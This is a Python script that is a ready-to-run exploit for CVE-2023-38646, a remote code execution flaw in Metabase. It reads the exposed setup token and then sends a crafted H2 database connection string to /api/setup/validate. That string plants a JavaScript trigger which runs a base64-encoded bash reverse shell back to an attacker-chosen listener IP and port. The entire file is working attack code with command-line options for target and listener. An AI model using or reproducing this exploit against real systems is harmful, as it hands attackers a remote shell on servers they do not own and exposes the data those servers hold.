from urllib.parse import urlparse
import requests
from rich.console import Console
import base64
import json
import argparse

console = Console()

def get_token_and_version(host):
    endpoint = "/api/session/properties"
    url = f"{host}{endpoint}"
    try:
        console.log(f"Getting the setup token from the {host} url: {url}")
        response = requests.get(url, verify=False)
        if response.status_code == 200:
            data = response.json()
            setup_token = data.get('setup-token')
            metabase_version = data.get("version", {}).get("tag")

            if setup_token is None:
                console.log(f"Setup token not found for this {url}", style="red")
            else:
                console.log(f"Setup Token: {setup_token}")
                console.log(f"Version: {metabase_version}")
            return setup_token
    except requests.exceptions.RequestException as e:
        console.log(f"Exception occurred: {e}", style="red")

def post_setup_validate(ip_address, setup_token, listener_ip, listener_port):
    payload = base64.b64encode(f"bash -c 'bash -i >& /dev/tcp/{listener_ip}/{listener_port} 0>&1'".encode()).decode()
    console.log(f"Payload = {payload}")

    endpoint = "/api/setup/validate"
    url = f"{ip_address}{endpoint}"
    headers = {'Content-Type': 'application/json'}
    data = {
        "token": setup_token,
        "details": {
            "is_on_demand": False,
            "is_full_sync": False,
            "is_sample": False,
            "cache_ttl": None,
            "refingerprint": False,
            "auto_run_queries": True,
            "schedules": {},
            "details": {
                "db": f"zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {{echo,{payload}}}|{{base64,-d}}|{{bash,-i}}')\n$$--=x",
                "advanced-options": False,
                "ssl": True
            },
            "name": "test",
            "engine": "h2"
        }
    }

    console.log(f"Sending request to {url} with headers {headers} and data {json.dumps(data, indent=4)}")

    try:
        response = requests.post(url, headers=headers, json=data, verify=False)
        console.log(f"Response received: {response.text}")
        if response.status_code == 200:
            console.log(f"POST to {url} successful.\n")
        else:
            console.log(f"POST to {url} failed with status code: {response.status_code}\n")
    except requests.exceptions.RequestException as e:
        console.log(f"Exception occurred: {e}")
        console.log(f"Failed to connect to {url}\n")

def preprocess_url(user_input):
    try:
        parsed_url = urlparse(user_input)
        protocol = f"{parsed_url.scheme}://" if parsed_url.scheme else "http://"
        netloc = parsed_url.netloc or parsed_url.path
        return protocol + netloc.rstrip('/')
    except:
        console.log("Kindly apply -h flag for help",style="blink bold")
        return

def main():
    parser = argparse.ArgumentParser(description="Cve exploit for the CVE-2023-38646 metabase RCE")
    parser.add_argument("-r", type=str, help="Metabase host server ip or domain with http:// or https:// and port number if needed")
    parser.add_argument("-lh", type=str, help="Your server ip")
    parser.add_argument("-lp", type=int, default=4444, help="Your port listening (default: 4444)")
    args = parser.parse_args()

    console.log(f"Rhost: {args.r}")
    args.r = preprocess_url(args.r)
    console.log(f"Preprocessed url: {args.r}")
    console.log(f"Arguments: {args.r} as remote host {args.lh} as localhost listening {args.lp} as localport listening on")
    setup_token = get_token_and_version(args.r)
    console.log(f"Token: {setup_token}")

    if setup_token:
        post_setup_validate(args.r, setup_token, args.lh, args.lp)

if __name__ == "__main__":
    main()
